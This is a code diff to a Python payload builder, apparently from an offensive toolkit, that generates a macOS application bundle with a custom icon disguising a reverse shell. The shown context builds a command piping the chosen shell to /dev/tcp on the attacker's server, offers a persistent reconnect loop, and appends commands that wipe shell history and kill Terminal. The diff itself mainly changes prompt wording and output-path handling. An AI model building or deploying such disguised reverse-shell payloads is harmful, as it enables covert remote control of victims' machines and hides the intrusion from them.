@@ -29,13 +29,13 @@ class payload:
 
 	def run(self,server):
 		while 1:
-			shell = raw_input(h.info_general_raw("Target Shell: ")).strip(" ")
+			shell = raw_input(h.info_general_raw("Target shell: ")).strip(" ")
 			while shell == "":
-			    shell = raw_input(h.info_general_raw("Target Shell: ")).strip(" ")
-                        icon = raw_input(h.info_general_raw("Application Icon: ")).strip(" ")
+			    shell = raw_input(h.info_general_raw("Target shell: ")).strip(" ")
+                        icon = raw_input(h.info_general_raw("Application icon: ")).strip(" ")
 			while icon == "":
-			    icon = raw_input(h.info_general_raw("Application Icon: ")).strip(" ")
-			persistence = raw_input(h.info_question_raw("Make Persistent? (y/n): ")).strip(" ").lower()
+			    icon = raw_input(h.info_general_raw("Application icon: ")).strip(" ")
+			persistence = raw_input(h.info_question_raw("Make persistent? (y/n): ")).strip(" ").lower()
 			if persistence == "y":
 				shell_command = "while true; do $("+shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1); sleep 5; done & "
 				break
@@ -43,12 +43,12 @@ class payload:
 				shell_command = shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1;"
 				break
 		shell_command += "history -wc;killall Terminal"
-		path = raw_input(h.info_general_raw("Output File: ")).strip(" ")
-		while path == "":
-		    path = raw_input(h.info_general_raw("Output File: ")).strip(" ")
+		path = raw_input(h.info_general_raw("Output path: ")).strip(" ")
+		if path == "":
+		    path = "payload.app"
 		if os.path.isdir(path):
 		    if os.path.exists(path):
-			if path[-1:] == "/":
+			if path[-1] == "/":
                              payload_save_path = path + "payload.app"
                         else:
                              payload_save_path = path + "/payload.app"
@@ -57,18 +57,19 @@ class payload:
 			exit
 		else:
 		    direct = os.path.split(path)[0]
-		    if direct != "":
-		        if os.path.exists(direct):
-		            if os.path.isdir(direct):
-		                payload_save_path = path
-		            else:
-			        h.info_error("Error: "+direct+": not a directory!")
-			        exit
-		        else:
-		            h.info_error("Local directory: "+direct+": does not exist!")
-		            exit
+		    if direct == "":
+			direct = "."
 		    else:
-			payload_save_path = path
+			pass
+		    if os.path.exists(direct):
+		        if os.path.isdir(direct):
+		            payload_save_path = path
+		        else:
+			    h.info_error("Error: "+direct+": not a directory!")
+			    exit
+		    else:
+		        h.info_error("Local directory: "+direct+": does not exist!")
+		        exit
 		os.system("cp -r data/app/payload.app "+path+" > /dev/null")
 		os.system("mv "+icon+" "+path+"/Contents/Resources/payload.icns > /dev/null")
 		payload = """\
